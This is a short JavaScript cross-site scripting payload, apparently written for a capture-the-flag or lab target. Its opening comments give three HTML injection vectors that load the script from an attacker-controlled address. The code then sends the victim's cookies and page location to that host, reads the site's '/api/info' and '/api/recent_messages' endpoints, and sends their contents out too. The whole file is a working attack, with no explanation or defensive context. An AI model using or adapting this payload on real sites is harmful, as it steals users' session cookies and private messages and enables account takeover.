// @manesec

// <img src="http://10.10.16.31/img" />
// <img src=x onerror="fetch('http://10.10.16.31/payload.js')" />
// <script src="http://10.10.16.31/payload.js"></script>

const server = "http://10.10.16.31";

function send(d){ 
  try{
    fetch( server + "/?=" + (encodeURIComponent(d.toString())));
  }catch{} 
}

function sendb64(d){ 
    try{
        fetch( server + "/?" + btoa(encodeURIComponent(d.toString())))
    }catch{} 
}

function fetchurl(url){
  fetch(url)
  .then(response => {
    if (!response.ok) {
      send("error to fetch");
    }
    return response.text();
  })
  .then(data => {
    send("data = " + data.toString());
  })
  .catch(error => {
    send("error to fetch 2");
  });
}

send("Loading_script");

send("Cookie = " + document.cookie);

send("Windows Location = " + window.location.toString());

fetchurl("/api/info")
fetchurl("/api/recent_messages")

send("Done");